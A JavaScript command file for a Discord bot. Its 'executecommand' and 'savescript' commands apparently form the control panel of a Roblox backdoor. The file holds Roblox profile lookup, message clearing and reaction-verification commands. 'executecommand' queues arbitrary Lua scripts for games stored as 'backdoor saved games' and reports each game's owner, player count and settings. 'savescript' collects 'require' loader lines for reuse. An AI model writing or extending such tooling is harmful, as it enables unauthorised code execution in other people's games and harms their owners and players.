import { SlashCommandBuilder, EmbedBuilder, Embed, CategoryChannel, ButtonBuilder, IntegrationExpireBehavior, verifyString, Events, InteractionCollector, MessageFlags, AttachmentBuilder} from "discord.js";
import mongoose, { Mongoose } from "mongoose";
import axios from 'axios';
import { ExpressStorage } from './storageExpress.js';
import { BotStorage, ReactionModel, SavedScriptsModel } from "./BotStorage.js";

const commands = [
    {
        name: 'profileviewer',

        data : new SlashCommandBuilder()
        .setName('profileviewer')
        .setDescription('View Roblox User Profile.')
        .addStringOption(option => 
            option.setName('userinfo')
            .setDescription('Put who you want to view user profile.')
            .setRequired(true)
        )
        .toJSON(),

        async execute() {
            const args = arguments;
            const interaction = args[0];
            const client = args[1];

            try {
                const userInfo = interaction.options.getString('userinfo') || interaction.options.getNumber('userinfo');
                let userId;

                if (!userInfo) return interaction.reply('Invalid User Info');
                if (isNaN(userInfo)) {
                    const newuserResponse = await axios.post('https://users.roblox.com/v1/usernames/users', {
                        usernames: [userInfo]
                    });
                    const userData = await newuserResponse.data;
                    userId = await userData.data[0].id;
                } else {
                    userId = userInfo;
                };

                const [Profile, Thumbnail] = await Promise.all([
                    axios.get(`https://users.roblox.com/v1/users/${userId}`),
                    axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`)
                ]);  

                const data = Profile.data;
                const avatarUrl = Thumbnail.data.data[0].imageUrl;

                const embed = new EmbedBuilder()
                .setTitle(`${data.displayName} (@${data.name})`)
                .setThumbnail(avatarUrl)
                .setURL(`https://www.roblox.com/users/${userId}/profile`)
                .setColor('Aqua')
                .setDescription('User Profile Details')
                .setFields(
                    {name: 'User Bio: ', value: data.description, inline: true},
                    {name: 'Is Verified?: ', value: data.hasVerifiedBadge ? 'Yes' : 'No', inline: true},
                    {name: 'Banned?: ', value: data.isBanned ? 'Yes' : 'No', inline: false},
                    {name: 'Creation Time: ', value: data.created, inline: true},
                )
                .setTimestamp()
                .setFooter({
                    text: 'Roblox Profile Info Data.',
                });

                interaction.reply({
                    embeds: [embed],
                });
                
            } catch(e) {
                interaction.reply(e.message);
            };
        },

    },
    {
        name: 'executecommand',

        data : new SlashCommandBuilder()
        .setName('executecommand')
        .setDescription('Execute command in game')
        .addStringOption(option => 
            option.setName('placeid')
            .setDescription('text placeid where you want to execute the code')
            .setAutocomplete(true)
            .setRequired(true)
        )
        .addStringOption(option => 
            option.setName('script')
            .setDescription('put here the script what you want to execute')
            .setRequired(true)
        ).toJSON(),

        AutoComplete: true,
        async AutoCompleteFunction(interaction) {
            const focusedValue = interaction.options.getFocused();
            const choices = Object.keys(ExpressStorage.savedGames) || {};
            const filtered = choices.filter(id => {
                const gameData = ExpressStorage.savedGames[id];
                return (
                    id.includes(focusedValue) || gameData.gameName.toLowerCase().includes(focusedValue)
                );
            });   
            await interaction.respond(
                filtered.slice(0, 25).map(gameId => ({name: `${ExpressStorage.savedGames[gameId].gameName} (${gameId})`, value:String(gameId)})),
            );
        },

        async execute() {
            const args = arguments;
            const interaction = arguments[0];
            const client = arguments[1];
            const placeId = interaction.options.getString('placeid');
            const scriptCode = interaction.options.getString('script');

            if (!scriptCode || !placeId) 
                {
                    return(interaction.reply('make you sure you inputed the correct script & placeid'))
                } else if (!ExpressStorage.savedGames[String(placeId)]) {
                    return(interaction.reply('The game is not found in backdoor saved games.'));
                }

            try {

                const gameinfoPromise = new Promise(async (callback, err) => {
                    const universeresponse = await axios.get(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`); // 6787156005
                    const universedata = await universeresponse.data;
                    const universeId = universedata && universedata.universeId ? universedata.universeId : null;
                    
                    const gameinforesponse = await axios.get(`https://games.roblox.com/v1/games?universeIds=${universeId}`);
                    const gameinfodata = await gameinforesponse.data.data[0];
                    
                    if (gameinfodata) {
                        return(callback(gameinfodata));
                    } else {
                        return(err('game info data not found.'))
                    }
                });
                const gameinfo = await gameinfoPromise;
                const gameImageResponse = await axios.get(`https://thumbnails.roblox.com/v1/games/icons?universeIds=${gameinfo.id}&size=150x150&format=Png&isCircular=false`);
                const gameImagedata = await gameImageResponse.data.data[0];
                const gameImageUrl = await gameImagedata.imageUrl ? gameImagedata.imageUrl : 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThxpwPKHBP41r-01lGuLh4YE2Q7rG4EUv13A&s.png'

                if (ExpressStorage.savedGames[String(placeId)] && ExpressStorage.savedGames[String(placeId)].executeds) {
                    ExpressStorage.savedGames[String(placeId)].executeds.push({
                        PlaceId: placeId,
                        Source : scriptCode,
                    });
                };

                const Embed = new EmbedBuilder()
                .setTitle(`**━━ ExecutingScript ━━**`)
                .setColor(0x66ff00)
                .setDescription(`# **${gameinfo.name}**`)
                .setThumbnail(gameImageUrl)
                .addFields([
                    {   
                        name: `**━━ Game Info ━━**`, 
                        value:
                        `> **Name:** ${gameinfo.name}\n`+
                        `> **Game Link:** [Link](https://roblox.com/games/${gameinfo.rootPlaceId})/\n`+
                        `> **Active Players:** \`${gameinfo.playing}\`\n`+
                        `> **Visits:** \`${gameinfo.visits}\`\n`
                    , inline:true
                    },
                    {
                        name: '**━━ Owner Info ━━**', 
                        value: 
                        `> **Creator Name:** \`${gameinfo.creator.name}\`\n`+ 
                        `> **Creator Id:** \`${gameinfo.creator.id}\`\n`+
                        `> **Creator Link:** [Link](https://roblox.com/users/${gameinfo.creator.id}/profile)\n`+
                        `> **Verified: **${(gameinfo.creator.hasVerifiedBadge === true) ? '# **Yes**' : 'No'}`
                        , inline:true
                    },
                    {
                        name: '**━━ Settings ━━**',
                        value:
                        `> **AvatarRigType:** ${(gameinfo.universeAvatarType == 'MorphToR15') ? 'R15' : 'R6'}\n`+
                        `> **API Enabled:** ${(gameinfo.studioAccessToApisAllowed == true) ? '# **Yes**' : 'No'}\n`+
                        `> **Copying Allowed:** ${(gameinfo.copyingAllowed == true) ? '# **Yes**' : 'No'}`
                        , inline:true
                    },
                    {
                        name: '**━━ Executed Script ━━**',
                        value: `\`\`\`lua\n`+
                        `${scriptCode}\n`+
                        `\`\`\``
                        , inline: false,
                    },
                    {
                        name: '**━━ Join Code ━━**',
                        value: `\`\`\`js\n`+
                        `javascript:Roblox.GameLauncher.joinGameInstance(${gameinfo.rootPlaceId}, ${null});\n`+
                        `\`\`\``
                        , inline: false,
                    },
                    
                ])
                .setTimestamp(new Date())
                .setFooter({text: 'Game Has Detected'});    

                interaction.reply({
                    embeds: [Embed],
                });
                
            } catch(e) {
                interaction.reply(e.message);
            };
        },
    },
    {
        name: 'reacttoacces',

        data: new SlashCommandBuilder()
        .setName('reacttoacces')
        .setDescription('Create react accesing to the server!')
        .addStringOption(option => 
            option.setName('reaction')
            .setDescription('What kind emoji you want people to react and get verified')
            .setRequired(true)
        ).toJSON(),

        async execute() {
            const args = arguments;
            const interaction = args[0];
            const client = args[1];

            const getReaction = interaction.options.getString('reaction');
            if (!getReaction) {
                interaction.reply('Message did not found');

                setTimeout(() => {
                    interaction.deleteReply();
                }, 3000);

                return;
            };

            let ReactionData;
            if (BotStorage.ReactionData) {
                setTimeout(() => {
                    return(interaction.deleteReply());
                }, 3000);
                return(interaction.reply('Reaction data has already been initilized'));
            };

            try {

                const verifyEmbed = new EmbedBuilder()
                .setTitle('Verify To Access')
                .setDescription('Click to get verified')
                .setColor(0x0099ff)
                .setFooter({
                    text: `Verify - ${client.user.username}`,
                })
                .setTimestamp(new Date())

                const channel = await interaction.channel;
                await channel.bulkDelete(100, true);

                const newMessage = await channel.send({
                    embeds: [verifyEmbed],
                });

                BotStorage.ReactionData = {};
                const ReactionData = BotStorage.ReactionData;
                ReactionData.ReactionEmoji = getReaction;
                ReactionData.Channel = interaction.channel;
                ReactionData.MessageId = newMessage.id;
                ReactionData.GuildId = interaction.guildId;

                await ReactionModel.findOneAndUpdate(
                    {guildId: interaction.guildId},
                    {
                        ReactionEmoji: getReaction,
                        Channel: channel,
                        MessageId: newMessage.id,
                        guildId: interaction.guildId,
                    },
                    {
                        upsert: true,
                        returnDocument: 'after',
                        setDefaultsOnInsert: true,
                    },
                );
                
                await newMessage.react(getReaction);

                await interaction.reply('Message succesfully created & saved!')
                setTimeout(() => {
                    interaction.deleteReply();
                }, 3000);
            } catch(e) {
                interaction.reply(e.message);
                setTimeout(() => {
                    interaction.deleteReply();
                }, 3000);
            };
        },
    },
    {
        name: 'clear',

        data : new SlashCommandBuilder()
        .setName('clear')
        .setDescription('Clears the messages in the channel with given number range.')
        .addNumberOption(input => 
            input.setName('range')
            .setDescription('Put number how many messages you wanna delete in the channel.')
            .setRequired(true)
        )
        .toJSON(),

        async execute(interaction, client) {
            const range = interaction.options.getNumber('range');

            if(!range) return(interaction.reply({content: 'Make you sure putted the range number in it.', ephemeral: true}));

            try {
                const channel = await interaction.channel;
                await channel.bulkDelete(range, true);
                return(interaction.reply({content: 'Succesfully deleted messages', flags: [MessageFlags.Ephemeral]}));
            } catch(e) {
                return(interaction.reply({content: e.message, flags: [MessageFlags.Ephemeral]}));
            };
        }
    },
    {
        name: 'savescript',

        data : new SlashCommandBuilder()
        .setName('savescript')
        .setDescription('save a script that you using')
        .addStringOption(input => 
            input.setName('channelid')
            .setDescription('pick a channel where you want to save scripts.')
            .setRequired(true)
        )
        .addStringOption(input => 
            input.setName('source')
            .setDescription('Save a script what you want to save')
            .setRequired(true)
        )
        .toJSON(),


        async execute(interaction, client) {
            const channelId = interaction.options.getString('channelid');
            const ScriptSource = interaction.options.getString('source');

            // Küçük bir mantık düzeltmesi: !ScriptSource olmalı
            if (!channelId || !ScriptSource) {
                return interaction.reply({
                    content: 'Channel or Script not found!',
                    flags: [MessageFlags.Ephemeral],
                });
            }

            try {
                const trimedSource = ScriptSource.split('\n').map(s => s.trim()).filter(s => s.includes('require'));
                const channel = await client.channels.cache.get(channelId);

                if (!trimedSource || trimedSource.length === 0) return interaction.reply({ content: 'Script source not founded', flags: [MessageFlags.Ephemeral] });
                if (!channel) return interaction.reply({ content: 'Channel not found', flags: [MessageFlags.Ephemeral] });

                // Veritabanından güncel veriyi çek
                let dbData = await SavedScriptsModel.findOne({ name: 'SavedScriptsData' });

                // Embed Hazırlığı
                const Embed = new EmbedBuilder()
                    .setTitle('**━━ Saved Scripts ━━**')
                    .setTimestamp(new Date())
                    .setFooter({ text: '-- Saved Scripts --' });

                // Mevcut scriptler + yenileri birleştir (Embed'de göstermek için)
                const allScripts = dbData ? [...dbData.Scripts, ...trimedSource] : [...trimedSource];

                const formattedList = allScripts.map((s, index) => `**${index + 1}.** \`${s}\``).join('\n');
                
                Embed.addFields({
                    name: '📂 Kayıtlı Script Listesi',
                    value: formattedList || 'No Scripts Avaible.'
                });

                let message;
                try {
                    // Eğer veritabanında kayıtlı bir mesaj ID varsa onu bulmaya çalış
                    if (dbData && dbData.MessageId) {
                        message = await channel.messages.fetch(dbData.MessageId);
                    }
                } catch (e) {
                    message = null; // Mesaj silinmişse veya bulunamazsa null yap
                }

                const fileContent = "-- Saved Scripts --\n\n" + allScripts.join('\n');

                // 2. Metni Discord'un anlayacağı bir dosyaya (Attachment) çeviriyoruz
                const attachment = new AttachmentBuilder(Buffer.from(fileContent), { name: 'saved_scripts.lua' });

                // 3. Mesajı gönderirken dosyayı ekliyoruz
                if (!message) {
                    message = await channel.send({ 
                        content: "📂 **Saved Scripts Has Updated!**",
                        files: [attachment] 
                    });
                } else {
                    // NOT: Discord'da mevcut bir mesajdaki dosyayı "edit" ile değiştiremezsin. 
                    // Bu yüzden eski mesajı silip yenisini atmak veya yeni bir dosya mesajı yollamak en iyisidir.
                    await message.delete().catch(() => {}); 
                    message = await channel.send({ 
                        content: "🔄 **Saved Script List Has Updated:**",
                        files: [attachment] 
                    });
                }

                // VERİTABANINI GÜNCELLE
                // Not: Burada BotStorage.SavedScripts yerine doğrudan objeyi yönetiyoruz
                await SavedScriptsModel.updateOne(
                    { name: 'SavedScriptsData' },
                    {
                        $push: { Scripts: { $each: trimedSource } },
                        $set: { MessageId: message.id }, // Mesaj ID'sini her zaman güncelle
                        $setOnInsert: { name: 'SavedScriptsData' }
                    },
                    { upsert: true }
                );

                return interaction.reply({ content: 'Successfully saved and updated!', flags: [MessageFlags.Ephemeral] });

            } catch (e) {
                console.error(e);
                if (!interaction.replied) {
                    interaction.reply({ content: `Error: ${e.message}`, flags: [MessageFlags.Ephemeral] });
                }
            }
        }
    },
];

export default commands;